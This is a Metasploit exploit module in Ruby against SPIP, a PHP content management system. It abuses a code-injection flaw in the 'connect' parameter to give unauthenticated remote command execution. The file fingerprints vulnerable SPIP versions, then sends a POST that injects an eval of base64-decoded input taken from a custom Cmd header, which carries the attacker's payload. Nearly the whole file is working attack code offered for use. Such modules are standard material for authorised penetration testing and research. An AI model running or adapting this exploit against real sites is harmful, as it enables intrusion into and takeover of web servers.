# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;SPIP connect Parameter PHP Injection&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a PHP code injection in SPIP. The vulnerability exists in the
        connect parameter and allows an unauthenticated user to execute arbitrary commands
        with web user privileges. Branchs 2.0, 2.1 and 3 are concerned. Vulnerable versions
        are <2.0.21, <2.1.16 and < 3.0.3, but this module works only against branch 2.0 and
        has been tested successfully with SPIP 2.0.11 and SPIP 2.0.20 with Apache on Ubuntu
        and Fedora linux distributions.
      },
      &#039;Author&#039;         =>
        [
          &#039;Arnaud Pachot&#039;,   #Initial discovery
          &#039;Frederic Cikala&#039;, # PoC
          &#039;Davy Douhine&#039;     # PoC and MSF module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;OSVDB&#039;, &#039;83543&#039; ],
          [ &#039;BID&#039;, &#039;54292&#039; ],
          [ &#039;URL&#039;, &#039;http://contrib.spip.net/SPIP-3-0-3-2-1-16-et-2-0-21-a-l-etape-303-epate-la&#039; ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;Platform&#039;       => [&#039;php&#039;],
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        =>
        [
          [ &#039;Automatic&#039;, { } ]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Jul 04 2012&#039;))
 
    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to SPIP application&#039;, &#039;/&#039;]),
      ], self.class)
  end
 
  def check
    version = nil
    uri = normalize_uri(target_uri.path, "spip.php")
 
    res = send_request_cgi({ &#039;uri&#039; => "#{uri}" })
 
    if res and res.code == 200 and res.body =~ /<meta name="generator" content="SPIP (.*) \[/
      version = $1
    end
 
    if version.nil? and res.code == 200 and res.headers["Composed-By"] =~ /SPIP (.*) @/
      version = $1
    end
 
    if version.nil?
      return Exploit::CheckCode::Unknown
    end
 
    vprint_status("SPIP Version detected: #{version}")
 
    if version =~ /^2\.0/ and version < "2.0.21"
      return Exploit::CheckCode::Vulnerable
    elsif version =~ /^2\.1/ and version < "2.1.16"
      return Exploit::CheckCode::Appears
    elsif version =~ /^3\.0/ and version < "3.0.3"
      return Exploit::CheckCode::Appears
    end
 
    return Exploit::CheckCode::Safe
 
  end
 
  def exploit
    uri = normalize_uri(target_uri.path, &#039;spip.php&#039;)
    print_status("#{rhost}:#{rport} - Attempting to exploit...")
    res = send_request_cgi(
      {
        &#039;uri&#039;    => uri,
        &#039;method&#039; => &#039;POST&#039;,
        &#039;vars_post&#039; => {
          &#039;connect&#039; => "?><? eval(base64_decode($_SERVER[HTTP_CMD])); ?>",
        },
        &#039;headers&#039; => {
          &#039;Cmd&#039; => Rex::Text.encode_base64(payload.encoded)
        }
      })
  end
 
end

